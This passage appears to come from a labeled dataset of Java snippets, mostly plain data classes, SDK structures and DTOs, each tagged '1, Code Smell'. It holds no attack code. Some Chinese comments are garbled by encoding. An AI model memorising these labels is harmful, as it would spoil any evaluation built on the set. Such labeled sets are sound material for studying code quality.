  public static final String ACTION_RELOAD_STYLE=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.reload_style"";
  /** 
 * Intent  {@code String} extra for what to reload for the TERMUX_ACTIVITY.ACTION_RELOAD_STYLE intent. This has been deperecated. 
 */
  @Deprecated public static final String EXTRA_RELOAD_STYLE=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.reload_style"";
  /** 
 * Intent  {@code boolean} extra for whether to recreate activity for the TERMUX_ACTIVITY.ACTION_RELOAD_STYLE intent. 
 */
  public static final String EXTRA_RECREATE_ACTIVITY=TERMUX_APP.TERMUX_ACTIVITY_NAME + "".EXTRA_RECREATE_ACTIVITY"";
  /** 
 * Intent action to make termux request storage permissions 
 */
  public static final String ACTION_REQUEST_PERMISSIONS=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.request_storage_permissions"";
}
",1,Code Smell
"public final class VASPersonalNamePlate {
  ArrayList<Integer> carouselNamePlateIds;
  ArrayList<Integer> diyNamePlateContentIds;
  Integer diyNamePlateItemId;
  Integer extendNamePlateId;
  Integer gameNamePlateId;
  Integer isGray;
  Integer namePlateId;
  Integer vipLevel;
  Integer vipStarFlag;
  Integer vipType;
  public VASPersonalNamePlate(){
    this.carouselNamePlateIds=new ArrayList<>();
    this.diyNamePlateContentIds=new ArrayList<>();
  }
  public ArrayList<Integer> getCarouselNamePlateIds(){
    return this.carouselNamePlateIds;
  }
  public ArrayList<Integer> getDiyNamePlateContentIds(){
    return this.diyNamePlateContentIds;
  }
  public Integer getDiyNamePlateItemId(){
    return this.diyNamePlateItemId;
  }
  public Integer getExtendNamePlateId(){
    return this.extendNamePlateId;
  }
  public Integer getGameNamePlateId(){
    return this.gameNamePlateId;
  }
  public Integer getIsGray(){
    return this.isGray;
  }
  public Integer getNamePlateId(){
    return this.namePlateId;
  }
  public Integer getVipLevel(){
    return this.vipLevel;
  }
  public Integer getVipStarFlag(){
    return this.vipStarFlag;
  }
  public Integer getVipType(){
    return this.vipType;
  }
  public String toString(){
    return ""VASPersonalNamePlate{isGray="" + this.isGray + "",vipType=""+ this.vipType+ "",vipLevel=""+ this.vipLevel+ "",namePlateId=""+ this.namePlateId+ "",carouselNamePlateIds=""+ this.carouselNamePlateIds+ "",diyNamePlateItemId=""+ this.diyNamePlateItemId+ "",diyNamePlateContentIds=""+ this.diyNamePlateContentIds+ "",extendNamePlateId=""+ this.extendNamePlateId+ "",gameNamePlateId=""+ this.gameNamePlateId+ "",vipStarFlag=""+ this.vipStarFlag+ "",}"";
  }
  public VASPersonalNamePlate(  Integer num,  Integer num2,  Integer num3,  Integer num4,  ArrayList<Integer> arrayList,  Integer num5,  ArrayList<Integer> arrayList2,  Integer num6,  Integer num7,  Integer num8){
    this.carouselNamePlateIds=new ArrayList<>();
    this.diyNamePlateContentIds=new ArrayList<>();
    this.isGray=num;
    this.vipType=num2;
    this.vipLevel=num3;
    this.namePlateId=num4;
    this.carouselNamePlateIds=arrayList;
    this.diyNamePlateItemId=num5;
    this.diyNamePlateContentIds=arrayList2;
    this.extendNamePlateId=num6;
    this.gameNamePlateId=num7;
    this.vipStarFlag=num8;
  }
}",1,Code Smell
"public static class GroupInfo extends MessageMicro<GroupInfo> {
  static final FieldMap __fieldMap__;
  public final PBUInt32Field display_action=PBField.initUInt32(0);
  public final PBUInt32Field group_auth_type=PBField.initUInt32(0);
  public final PBStringField msg_alert=PBField.initString("""");
  public final PBStringField msg_detail_alert=PBField.initString("""");
  public final PBStringField msg_other_admin_done=PBField.initString("""");
  public final PBUInt32Field uint32_app_privilege_flag=PBField.initUInt32(0);
static {
    Integer integer=Integer.valueOf(0);
    __fieldMap__=MessageMicro.initFieldMap(new int[]{8,16,26,34,42,48},new String[]{""group_auth_type"",""display_action"",""msg_alert"",""msg_detail_alert"",""msg_other_admin_done"",""uint32_app_privilege_flag""},new Object[]{integer,integer,"""","""","""",integer},GroupInfo.class);
  }
}",1,Code Smell
"public static final class Label extends MessageMicro<Label> {
  public final PBBytesField bytes_name=PBField.initBytes(ByteStringMicro.EMPTY);
  public final PBEnumField enum_type=PBField.initEnum(1);
  public Color text_color=new Color();
  public Color edging_color=new Color();
  public final PBUInt32Field uint32_label_attr=PBField.initUInt32(0);
  public final PBUInt32Field uint32_label_type=PBField.initUInt32(0);
}",1,Code Smell
"public static class EM_SCADA_DEVICE_STATUS extends SdkStructure {
  public static final int EM_SCADA_DEVICE_STATUS_KNOWN=-1;
  public static final int EM_SCADA_DEVICE_STATUS_NORMAL=0;
  public static final int EM_SCADA_DEVICE_STATUS_ALARM=1;
  public static final int EM_SCADA_DEVICE_STATUS_OFFLINE=2;
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 * @date 2020/9/22
 */
public class ChangeAccountDTO {
  @NotNull(message=""userId not null"") @Schema(description=""鐢ㄦ埛id"") private Long userId;
  @NotBlank(message=""username not blank"") @Schema(description=""鐢ㄦ埛鍚�"") private String username;
  @NotBlank(message=""password not blank"") @Schema(description=""瀵嗙爜"") private String password;
  @NotNull(message=""status not null"") @Schema(description=""鐘舵�� 1鍚敤 0绂佺敤"") private Integer status;
  @Schema(description=""閭"") private String email;
  @Schema(description=""鎵嬫満鍙�"") private String phone;
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPhone(){
    return phone;
  }
  public void setPhone(  String phone){
    this.phone=phone;
  }
  @Override public String toString(){
    return ""ChangeAccountDTO{"" + ""userId="" + userId + "", username='""+ username+ '\''+ "", password='""+ password+ '\''+ "", status=""+ status+ "", email='""+ email+ '\''+ "", phone='""+ phone+ '\''+ '}';
  }
}",1,Code Smell
"public static class Res {
  public static final byte TYPE_NULL=0x00, TYPE_REFERENCE=0x01, TYPE_ATTRIBUTE=0x02, TYPE_STRING=0x03, TYPE_FLOAT=0x04, TYPE_DIMENSION=0x05, TYPE_FRACTION=0x06, TYPE_FIRST_INT=0x10, TYPE_INT_DEC=0x10, TYPE_INT_HEX=0x11, TYPE_INT_BOOLEAN=0x12, TYPE_FIRST_COLOR_INT=0x1c, TYPE_INT_COLOR_ARGB8=0x1c, TYPE_INT_COLOR_RGB8=0x1d, TYPE_INT_COLOR_ARGB4=0x1e, TYPE_INT_COLOR_RGB4=0x1f, TYPE_LAST_COLOR_INT=0x1f, TYPE_LAST_INT=0x1f;
  public static final int COMPLEX_UNIT_SHIFT=0, COMPLEX_UNIT_MASK=0xf, COMPLEX_UNIT_PX=0, COMPLEX_UNIT_DIP=1, COMPLEX_UNIT_SP=2, COMPLEX_UNIT_PT=3, COMPLEX_UNIT_IN=4, COMPLEX_UNIT_MM=5, COMPLEX_UNIT_FRACTION=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_SHIFT=4, COMPLEX_RADIX_MASK=0x3, COMPLEX_RADIX_23p0=0, COMPLEX_RADIX_16p7=1, COMPLEX_RADIX_8p15=2, COMPLEX_RADIX_0p23=3, COMPLEX_MANTISSA_SHIFT=8, COMPLEX_MANTISSA_MASK=0xffffff;
  public byte dataType;
  public int data;
  public String str;
}",1,Code Smell
"public class Line {
  public long[] y;
  public SegmentTree segmentTree;
  public String id;
  public String name;
  public long maxValue=0;
  public long minValue=Long.MAX_VALUE;
  public int colorKey;
  public int color=Color.BLACK;
  public int colorDark=Color.WHITE;
}",1,Code Smell
"public static class EM_TRAFFICCAR_CAR_TYPE extends SdkStructure {
  public static final int EM_TRAFFICCAR_CAR_TYPE_UNKNOWN=0;
  public static final int EM_TRAFFICCAR_CAR_TYPE_TRUST_CAR=1;
  public static final int EM_TRAFFICCAR_CAR_TYPE_SUSPICIOUS_CAR=2;
  public static final int EM_TRAFFICCAR_CAR_TYPE_NORMAL_CAR=3;
}",1,Code Smell
"public class ModifyCollectionPayload implements ReflectMapWriter {
  @JsonProperty public Integer replicationFactor;
  @JsonProperty public Boolean readOnly;
  @JsonProperty public String config;
  @JsonProperty public Map<String,Object> properties;
  @JsonProperty public String async;
}
",1,Code Smell
"public static class Value {
  @JSONField(alternateNames={""song_list"",""songList""}) List<Value2> songList;
  @JSONField(alternateNames=""songlist"") String songlist;
  public List<Value2> getSongList(){
    return songList;
  }
  public void setSongList(  List<Value2> songList){
    this.songList=songList;
  }
  public String getSonglist(){
    return songlist;
  }
  public void setSonglist(  String songlist){
    this.songlist=songlist;
  }
}",1,Code Smell
"/** 
 * Paged result.
 */
public static class PagedResult<T> {
  @SerializedName(""pageNum"") private Integer pageNum;
  @SerializedName(""pageSize"") private Integer pageSize;
  /** 
 * Total pages.
 */
  @SerializedName(""pages"") private Integer pages;
  /** 
 * Total elements.
 */
  @SerializedName(""total"") private Integer total;
  @SerializedName(""items"") private List<T> items;
  public PagedResult(){
  }
  public Integer getPageNum(){
    return pageNum;
  }
  public void setPageNum(  Integer pageNum){
    this.pageNum=pageNum;
  }
  public Integer getPageSize(){
    return pageSize;
  }
  public void setPageSize(  Integer pageSize){
    this.pageSize=pageSize;
  }
  public Integer getPages(){
    return pages;
  }
  public void setPages(  Integer pages){
    this.pages=pages;
  }
  public Integer getTotal(){
    return total;
  }
  public void setTotal(  Integer total){
    this.total=total;
  }
  public List<T> getItems(){
    return items;
  }
  public void setItems(  List<T> items){
    this.items=items;
  }
}
",1,Code Smell
"public final class GProPAInstructionInfo implements Serializable {
  String data;
  long logoutTime;
  int logoutType;
  int modal;
  String f305536msg;
  String ruleFamily;
  String ruleName;
  long serialVersionUID;
  String title;
  int type;
  String url;
  public GProPAInstructionInfo(){
    this.serialVersionUID=1L;
    this.title="""";
    this.f305536msg="""";
    this.url="""";
    this.data="""";
    this.ruleName="""";
    this.ruleFamily="""";
  }
  public String getData(){
    return this.data;
  }
  public long getLogoutTime(){
    return this.logoutTime;
  }
  public int getLogoutType(){
    return this.logoutType;
  }
  public int getModal(){
    return this.modal;
  }
  public String getMsg(){
    return this.f305536msg;
  }
  public String getRuleFamily(){
    return this.ruleFamily;
  }
  public String getRuleName(){
    return this.ruleName;
  }
  public String getTitle(){
    return this.title;
  }
  public int getType(){
    return this.type;
  }
  public String getUrl(){
    return this.url;
  }
  public String toString(){
    return ""GProPAInstructionInfo{type="" + this.type + "",title=""+ this.title+ "",msg=""+ this.f305536msg+ "",url = ""+ this.url+ "",modal=""+ this.modal+ "",data=""+ this.data+ "",logoutTime=""+ this.logoutTime+ "",ruleName=""+ this.ruleName+ "",ruleFamily=""+ this.ruleFamily+ "",logoutType=""+ this.logoutType+ "",}"";
  }
  public GProPAInstructionInfo(  int i2,  String str,  String str2,  String str3,  int i3,  String str4,  long j2,  String str5,  String str6,  int i4){
    this.serialVersionUID=1L;
    this.title="""";
    this.f305536msg="""";
    this.url="""";
    this.data="""";
    this.ruleName="""";
    this.ruleFamily="""";
    this.type=i2;
    this.title=str;
    this.f305536msg=str2;
    this.url=str3;
    this.modal=i3;
    this.data=str4;
    this.logoutTime=j2;
    this.ruleName=str5;
    this.ruleFamily=str6;
    this.logoutType=i4;
  }
}",1,Code Smell
"public static class NET_EM_WATER_LEVEL_STATUS extends SdkStructure {
  public static final int NET_EM_WATER_LEVEL_STATUS_UNKNOWN=0;
  public static final int NET_EM_WATER_LEVEL_STATUS_NORMAL=1;
  public static final int NET_EM_WATER_LEVEL_STATUS_HIGH=2;
  public static final int NET_EM_WATER_LEVEL_STATUS_LOW=3;
}",1,Code Smell
"public static class NET_DVR_SENSOR_PARAM extends Structure {
  public byte bySensorType;
  public byte[] byRes=new byte[31];
  public float fHorWidth;
  public float fVerWidth;
  public float fFold;
}",1,Code Smell
"/** 
 * An in-memory data file. 
 */
public static class Data {
  public final BinaryRow partition;
  public final int bucket;
  public final DataFileMeta meta;
  public final List<KeyValue> content;
  private Data(  BinaryRow partition,  int bucket,  DataFileMeta meta,  List<KeyValue> content){
    this.partition=partition;
    this.bucket=bucket;
    this.meta=meta;
    this.content=content;
  }
}
",1,Code Smell
"static class NoneSerializable_X5 {
  public String param;
  public String param2;
  public String param3;
  public String param4;
  public String param5;
}",1,Code Smell
"public class QuartzTaskDTO extends Rule {
  private String type;
  private String taskName;
  private List<String> tags=new ArrayList<>();
  private List<SelectTag> SelectTags=new LinkedList<>();
  private String accountId;
  private String regions;
  private String projectId;
  private String groupId;
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getTaskName(){
    return taskName;
  }
  public void setTaskName(  String taskName){
    this.taskName=taskName;
  }
  public List<String> getTags(){
    return tags;
  }
  public void setTags(  List<String> tags){
    this.tags=tags;
  }
  public List<SelectTag> getSelectTags(){
    return SelectTags;
  }
  public void setSelectTags(  List<SelectTag> SelectTags){
    this.SelectTags=SelectTags;
  }
  public String getAccountId(){
    return accountId;
  }
  public void setAccountId(  String accountId){
    this.accountId=accountId;
  }
  public String getRegions(){
    return regions;
  }
  public void setRegions(  String regions){
    this.regions=regions;
  }
  public String getProjectId(){
    return projectId;
  }
  public void setProjectId(  String projectId){
    this.projectId=projectId;
  }
  public String getGroupId(){
    return groupId;
  }
  public void setGroupId(  String groupId){
    this.groupId=groupId;
  }
}
",1,Code Smell
"/** 
 * 璁㈠崟鍙傛暟
 * @author FrozenWatermelon
 * @date 2020-12-04 11:27:35
 */
public class OrderDTO {
  @Schema(description=""绔嬪嵆璐拱鏃舵彁浜ょ殑鍟嗗搧椤�,濡傛灉璇ュ�间负绌猴紝鍒欒鏄庢槸浠庤喘鐗╄溅杩涘叆锛屽鏋滆鍊间笉涓虹┖鍒欒鏄庝负绔嬪嵆璐拱"") private ShopCartItemDTO shopCartItem;
  @NotNull(message=""閰嶉�佺被鍨嬩笉鑳戒负绌�"") @Schema(description=""閰嶉�佺被鍨�3锛氭棤闇�蹇��"") private Integer dvyType;
  @Schema(description=""鍦板潃ID锛�0涓洪粯璁ゅ湴鍧�"") @NotNull(message=""鍦板潃涓嶈兘涓虹┖"") private Long addrId;
  public Integer getDvyType(){
    return dvyType;
  }
  public void setDvyType(  Integer dvyType){
    this.dvyType=dvyType;
  }
  public ShopCartItemDTO getShopCartItem(){
    return shopCartItem;
  }
  public void setShopCartItem(  ShopCartItemDTO shopCartItem){
    this.shopCartItem=shopCartItem;
  }
  public Long getAddrId(){
    return addrId;
  }
  public void setAddrId(  Long addrId){
    this.addrId=addrId;
  }
  @Override public String toString(){
    return ""OrderDTO{"" + ""shopCartItem="" + shopCartItem + "", dvyType=""+ dvyType+ "", addrId=""+ addrId+ '}';
  }
}",1,Code Smell
"public class VersionManifest {
  public static final String TYPE_SNAPSHOT=""snapshot"";
  public static final String TYPE_RELEASE=""release"";
  public static final String TYPE_OLD_BETA=""old_beta"";
  public static final String TYPE_OLD_ALPHA=""old_alpha"";
  public Latest latest;
  public Version[] versions;
  public Latest getLatest(){
    return latest;
  }
  public Version[] getVersions(){
    return versions;
  }
private static class Latest {
    private String release;
    private String snapshot;
    public String getRelease(){
      return release;
    }
    public String getSnapshot(){
      return snapshot;
    }
  }
public static class Version {
    private String id;
    private String type;
    private String url;
    private Date time;
    private Date releaseTime;
    public String getId(){
      return id;
    }
    public String getType(){
      return type;
    }
    public String getUrl(){
      return url;
    }
    public Date getTime(){
      return time;
    }
    public Date getReleaseTime(){
      return releaseTime;
    }
  }
}
",1,Code Smell
"public final class GroupShutUpGrayElement implements Serializable {
  GrayTipGroupMember admin;
  long curTime;
  long duration;
  GrayTipGroupMember member;
  long serialVersionUID;
  public GroupShutUpGrayElement(){
    this.serialVersionUID=1L;
    this.admin=new GrayTipGroupMember();
    this.member=new GrayTipGroupMember();
  }
  public GrayTipGroupMember getAdmin(){
    return this.admin;
  }
  public long getCurTime(){
    return this.curTime;
  }
  public long getDuration(){
    return this.duration;
  }
  public GrayTipGroupMember getMember(){
    return this.member;
  }
  public String toString(){
    return ""GroupShutUpGrayElement{curTime="" + this.curTime + "",duration=""+ this.duration+ "",admin=""+ this.admin+ "",member=""+ this.member+ "",}"";
  }
  public GroupShutUpGrayElement(  long j2,  long j3,  GrayTipGroupMember grayTipGroupMember,  GrayTipGroupMember grayTipGroupMember2){
    this.serialVersionUID=1L;
    this.admin=new GrayTipGroupMember();
    this.member=new GrayTipGroupMember();
    this.curTime=j2;
    this.duration=j3;
    this.admin=grayTipGroupMember;
    this.member=grayTipGroupMember2;
  }
}",1,Code Smell
"@JSONCompiled public static class Bean {
  public String courseId;
  public String userId;
  public String studyRate;
  public String resourceId;
  public String providerCorpCode;
  public String userAgent;
  public String sourceId;
}
",1,Code Smell
"public static class DEV_EVENT_MANSTAND_DETECTION_INFO extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[NET_EVENT_NAME_LEN];
  public byte[] bReserved1=new byte[4];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public int nAction;
  public int nManListCount;
  public MAN_STAND_LIST_INFO[] stuManList=new MAN_STAND_LIST_INFO[MAX_MAN_LIST_COUNT];
  public EVENT_INTELLI_COMM_INFO stuIntelliCommInfo;
  public byte[] szReversed=new byte[2048];
  public DEV_EVENT_MANSTAND_DETECTION_INFO(){
    for (int i=0; i < stuManList.length; ++i) {
      stuManList[i]=new MAN_STAND_LIST_INFO();
    }
  }
}",1,Code Smell
"/** 
 */
public class SpellingOptions {
  /** 
 * The tokens to spell check 
 */
  public Collection<Token> tokens;
  /** 
 * An optional  {@link org.apache.lucene.index.IndexReader} 
 */
  public IndexReader reader;
  /** 
 * The number of suggestions to return, if there are any. Defaults to 1. 
 */
  public int count=1;
  public int alternativeTermCount=0;
  public SuggestMode suggestMode=SuggestMode.SUGGEST_WHEN_NOT_IN_INDEX;
  /** 
 * Provide additional, per implementation, information about the results 
 */
  public boolean extendedResults;
  /** 
 * Optionally restrict the results to have a minimum accuracy level. Per Implementation. By default set to Float.MIN_VALUE.
 */
  public float accuracy=Float.MIN_VALUE;
  /** 
 * Any other custom params can be passed through. May be null and is null by default. 
 */
  public SolrParams customParams;
  public SpellingOptions(){
  }
  public SpellingOptions(  Collection<Token> tokens,  int count){
    this.tokens=tokens;
    this.count=count;
  }
  public SpellingOptions(  Collection<Token> tokens,  IndexReader reader){
    this.tokens=tokens;
    this.reader=reader;
  }
  public SpellingOptions(  Collection<Token> tokens,  IndexReader reader,  int count){
    this.tokens=tokens;
    this.reader=reader;
    this.count=count;
  }
  public SpellingOptions(  Collection<Token> tokens,  IndexReader reader,  int count,  SuggestMode suggestMode,  boolean extendedResults,  float accuracy,  SolrParams customParams){
    this.tokens=tokens;
    this.reader=reader;
    this.count=count;
    this.suggestMode=suggestMode;
    this.extendedResults=extendedResults;
    this.accuracy=accuracy;
    this.customParams=customParams;
  }
  public SpellingOptions(  Collection<Token> tokens,  IndexReader reader,  int count,  int alternativeTermCount,  SuggestMode suggestMode,  boolean extendedResults,  float accuracy,  SolrParams customParams){
    this.tokens=tokens;
    this.reader=reader;
    this.count=count;
    this.alternativeTermCount=alternativeTermCount;
    this.suggestMode=suggestMode;
    this.extendedResults=extendedResults;
    this.accuracy=accuracy;
    this.customParams=customParams;
  }
}",1,Code Smell
"/** 
 * Bitrate limits for resolution.
 */
public class ResolutionBitrateLimits {
  /** 
 * Maximum size of video frame, in pixels, the bitrate limits are intended for.
 */
  public final int frameSizePixels;
  /** 
 * Recommended minimum bitrate to start encoding.
 */
  public final int minStartBitrateBps;
  /** 
 * Recommended minimum bitrate.
 */
  public final int minBitrateBps;
  /** 
 * Recommended maximum bitrate.
 */
  public final int maxBitrateBps;
  public ResolutionBitrateLimits(  int frameSizePixels,  int minStartBitrateBps,  int minBitrateBps,  int maxBitrateBps){
    this.frameSizePixels=frameSizePixels;
    this.minStartBitrateBps=minStartBitrateBps;
    this.minBitrateBps=minBitrateBps;
    this.maxBitrateBps=maxBitrateBps;
  }
  @CalledByNative(""ResolutionBitrateLimits"") public int getFrameSizePixels(){
    return frameSizePixels;
  }
  @CalledByNative(""ResolutionBitrateLimits"") public int getMinStartBitrateBps(){
    return minStartBitrateBps;
  }
  @CalledByNative(""ResolutionBitrateLimits"") public int getMinBitrateBps(){
    return minBitrateBps;
  }
  @CalledByNative(""ResolutionBitrateLimits"") public int getMaxBitrateBps(){
    return maxBitrateBps;
  }
}
",1,Code Smell
"public class AwardReq {
  private String uId;
  private Integer awardType;
  private String awardNumber;
  private String bizId;
  private Map<String,String> extMap;
  public String getuId(){
    return uId;
  }
  public void setuId(  String uId){
    this.uId=uId;
  }
  public Integer getAwardType(){
    return awardType;
  }
  public void setAwardType(  Integer awardType){
    this.awardType=awardType;
  }
  public String getAwardNumber(){
    return awardNumber;
  }
  public void setAwardNumber(  String awardNumber){
    this.awardNumber=awardNumber;
  }
  public String getBizId(){
    return bizId;
  }
  public void setBizId(  String bizId){
    this.bizId=bizId;
  }
  public Map<String,String> getExtMap(){
    return extMap;
  }
  public void setExtMap(  Map<String,String> extMap){
    this.extMap=extMap;
  }
}
",1,Code Smell
"public static class NET_IN_WM_SAVE_COLLECTION extends SdkStructure {
  public int dwSize;
  public int nMonitorWallID;
  public Pointer pszName;
  public String pszControlID;
  public int emType;
  public NET_IN_WM_SAVE_COLLECTION(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class NET_RADIOMETRYINFO extends SdkStructure {
  public int nMeterType;
  public int nTemperUnit;
  public float fTemperAver;
  public float fTemperMax;
  public float fTemperMin;
  public float fTemperMid;
  public float fTemperStd;
  public byte[] reserved=new byte[64];
}",1,Code Smell
"public final class GroupFileInfoResult {
  String clientWording;
  GroupFileInfo fileInfo;
  int retCode;
  String retMsg;
  public GroupFileInfoResult(){
    this.retMsg="""";
    this.clientWording="""";
    this.fileInfo=new GroupFileInfo();
  }
  public String getClientWording(){
    return this.clientWording;
  }
  public GroupFileInfo getFileInfo(){
    return this.fileInfo;
  }
  public int getRetCode(){
    return this.retCode;
  }
  public String getRetMsg(){
    return this.retMsg;
  }
  public String toString(){
    return ""GroupFileInfoResult{retCode="" + this.retCode + "",retMsg=""+ this.retMsg+ "",clientWording=""+ this.clientWording+ "",fileInfo=""+ this.fileInfo+ "",}"";
  }
  public GroupFileInfoResult(  int i2,  String str,  String str2,  GroupFileInfo groupFileInfo){
    this.retMsg="""";
    this.clientWording="""";
    this.fileInfo=new GroupFileInfo();
    this.retCode=i2;
    this.retMsg=str;
    this.clientWording=str2;
    this.fileInfo=groupFileInfo;
  }
}",1,Code Smell
"/** 
 * core_version: X.Y.Z plugin_interface_version: X.Y.Z plugin_version: X.Y.Z plugin_name: name
 */
public class VersionFileParser {
  private static final String FILE_TO_READ=""version.yaml"";
  private static final String CORE_VERSION=""core_version"";
  private static final String PLUGIN_INTERFACE_VERSION=""plugin_interface_version"";
  private static final String PLUGIN_VERSION=""plugin_version"";
  private static final String PLUGIN_NAME=""plugin_name"";
  private final String coreVersion;
  private final String pluginName;
  private final String pluginVersion;
  private final String pluginInterfaceVersion;
  public VersionFileParser() throws IOException {
    List<String> allLines=Files.readAllLines(Paths.get(FILE_TO_READ));
    String coreVersion=null;
    String pluginInterfaceVersion=null;
    String pluginVersion=null;
    String pluginName=null;
    for (    String line : allLines) {
      if (line.contains(CORE_VERSION)) {
        coreVersion=line.split("":"")[1].trim();
      }
 else       if (line.contains(PLUGIN_INTERFACE_VERSION)) {
        pluginInterfaceVersion=line.split("":"")[1].trim();
      }
 else       if (line.contains(PLUGIN_VERSION)) {
        pluginVersion=line.split("":"")[1].trim();
      }
 else       if (line.contains(PLUGIN_NAME)) {
        pluginName=line.split("":"")[1].trim();
      }
    }
    if (coreVersion == null || pluginInterfaceVersion == null || pluginVersion == null || pluginName == null) {
      throw new QuitProgramException(""version.yaml doesn't seem to have valid content. Please redownload SuperTokens by visiting "" + ""your SuperTokens dashboard."",null);
    }
    this.coreVersion=coreVersion;
    this.pluginInterfaceVersion=pluginInterfaceVersion;
    this.pluginName=pluginName;
    this.pluginVersion=pluginVersion;
  }
  public String getCoreVersion(){
    return this.coreVersion;
  }
  public String getPluginVersion(){
    return this.pluginVersion;
  }
  public String getPluginName(){
    return this.pluginName;
  }
  public String getPluginInterfaceVersion(){
    return this.pluginInterfaceVersion;
  }
}",1,Code Smell
"public static class PreferenceConsts {
  public static final String FILE_NAME=""settings"";
  /** 
 * this stands for a boolean value
 */
  public static final String ANONYMOUS_MODE=""anonymous_mode"";
  public static final boolean ANONYMOUS_MODE_DEFAULT=true;
  /** 
 * this stands for a string value
 */
  public static final String ANONYMOUS_MODE_PATH=""anonymous_mode_path"";
  public static final String ANONYMOUS_MODE_PATH_DEFAULT=StorageUtil.getMainStoragePath();
  /** 
 * this stands for a boolean value
 */
  public static final String ANONYMOUS_MODE_WRITABLE=""anonymous_mode_writable"";
  public static final boolean ANONYMOUS_MODE_WRITABLE_DEFAULT=true;
  /** 
 * this stands for a boolean value
 */
  public static final String WAKE_LOCK=""wake_lock"";
  public static final boolean WAKE_LOCK_DEFAULT=false;
  /** 
 * this stands for a int value
 */
  public static final String PORT_NUMBER=""port_number"";
  public static int PORT_NUMBER_DEFAULT=2121;
  /** 
 * this stands for a string value
 */
  public static final String CHARSET_TYPE=""charset_type"";
  public static final String CHARSET_TYPE_DEFAULT=""UTF-8"";
  public static final String MAX_ANONYMOUS_NUM=""max_anonymous_logins"";
  public static final String MAX_LOGIN_NUM=""max_logins"";
  /** 
 * int value
 */
  public static final String NIGHT_MODE=""night_mode"";
  public static final int NIGHT_MODE_DEFAULT=AppCompatDelegate.MODE_NIGHT_NO;
  /** 
 * int value
 */
  public static final String LANGUAGE_SETTING=""language_setting"";
  public static final int LANGUAGE_FOLLOW_SYSTEM=0;
  public static final int LANGUAGE_SIMPLIFIED_CHINESE=1;
  public static final int LANGUAGE_ENGLISH=2;
  public static final int LANGUAGE_SETTING_DEFAULT=LANGUAGE_FOLLOW_SYSTEM;
  /** 
 * int value
 */
  public static final String AUTO_STOP=""auto_stop"";
  public static final int AUTO_STOP_NONE=-1;
  public static final int AUTO_STOP_WIFI_DISCONNECTED=0;
  public static final int AUTO_STOP_AP_DISCONNECTED=1;
  public static final int AUTO_STOP_TIME_COUNT=2;
  public static final int AUTO_STOP_DEFAULT=AUTO_STOP_NONE;
  /** 
 * int value
 */
  public static final String AUTO_STOP_VALUE=""auto_stop_value"";
  public static final int AUTO_STOP_VALUE_DEFAULT=600;
  /** 
 * boolean value
 */
  public static final String START_AFTER_BOOT=""start_after_boot"";
  public static final boolean START_AFTER_BOOT_DEFAULT=false;
}",1,Code Smell
"public static class NET_IN_START_REMOTE_UPGRADE_INFO extends SdkStructure {
  public int dwSize;
  public int nListNum;
  public Pointer pstuList;
  public Pointer pReserved;
  public byte[] szFileName=new byte[256];
  public Callback cbRemoteUpgrade;
  public Pointer dwUser;
  public NET_IN_START_REMOTE_UPGRADE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * database ample information
 * @author daizhenyu
 * @since 2024-02-01
 */
public class DatabaseInfo {
  private DatabaseType databaseType;
  private String databaseName;
  private String hostAddress;
  private int port;
  /** 
 * no parameter construction method
 */
  public DatabaseInfo(){
  }
  /** 
 * parameter construction method
 * @param type database type
 */
  public DatabaseInfo(  DatabaseType type){
    databaseType=type;
  }
  public int getPort(){
    return port;
  }
  public void setPort(  int port){
    this.port=port;
  }
  public String getDatabaseName(){
    return databaseName;
  }
  public void setDatabaseName(  String databaseName){
    this.databaseName=databaseName;
  }
  public String getHostAddress(){
    return hostAddress;
  }
  public void setHostAddress(  String hostAddress){
    this.hostAddress=hostAddress;
  }
  public DatabaseType getDatabaseType(){
    return databaseType;
  }
  public void setDatabaseType(  DatabaseType databaseType){
    this.databaseType=databaseType;
  }
}",1,Code Smell
"public static class ShortCircuitResult {
  private final Queue<RowBatch> rowBatches;
  private final long affectedRows;
  private final RuntimeProfile runtimeProfile;
  private final String resultInfo;
  public ShortCircuitResult(  Queue<RowBatch> rowBatches,  long affectedRows,  RuntimeProfile runtimeProfile){
    this.rowBatches=rowBatches;
    this.affectedRows=affectedRows;
    this.runtimeProfile=runtimeProfile;
    this.resultInfo=null;
  }
  public Queue<RowBatch> getRowBatches(){
    return rowBatches;
  }
  public long getAffectedRows(){
    return affectedRows;
  }
  public Optional<RuntimeProfile> getRuntimeProfile(){
    return Optional.ofNullable(runtimeProfile);
  }
  public String getResultInfo(){
    return resultInfo;
  }
}
",1,Code Smell
"public static class NET_DVR_MATRIX_ROW_COLUMN_LINK extends Structure {
  public int dwSize;
  public int dwRowNum;
  public byte[] sSurvChanName=new byte[128];
  public int dwSurvNum;
  public int dwGlobalDispChanNum;
  public int dwLocalDispChanNum;
  public int dwTimeSel;
  public NET_DVR_TIME StartTime;
  public NET_DVR_TIME StopTime;
  public byte[] sFileName=new byte[128];
}",1,Code Smell
"public static class Cache {
  /** 
 * Enable the Resource caching.
 */
  private boolean enabled=true;
  /** 
 * Resource cache directory. Used to cache remote resources, such as the ONNX models, to the local file system. Applicable only for cache.enabled == true. Defaults to {java.io.tmpdir}/spring-ai-onnx-generative.
 */
  private String directory=DEFAULT_CACHE_DIRECTORY;
  public boolean isEnabled(){
    return this.enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
  public String getDirectory(){
    return this.directory;
  }
  public void setDirectory(  String directory){
    this.directory=directory;
  }
}
",1,Code Smell
"/** 
